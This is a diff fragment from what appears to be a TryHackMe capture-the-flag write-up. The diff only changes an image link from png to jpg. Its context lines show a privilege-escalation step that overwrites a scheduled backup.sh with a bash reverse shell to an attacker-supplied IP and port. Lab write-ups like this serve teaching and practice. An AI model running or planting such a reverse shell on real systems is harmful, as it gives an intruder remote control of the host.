@@ -252,7 +252,7 @@ if we search in the backups dir we will find backup.sh that runs every-time,so n
 echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/ip/Your-IP/port 0>&1" >> backup.sh
 ```
 
-![alt text](https://thelastvvv.github.io/images/posts/3/ttt2.png "THM")
+![alt text](https://thelastvvv.github.io/images/posts/3/ttt2.jpg "THM")
 
 
 
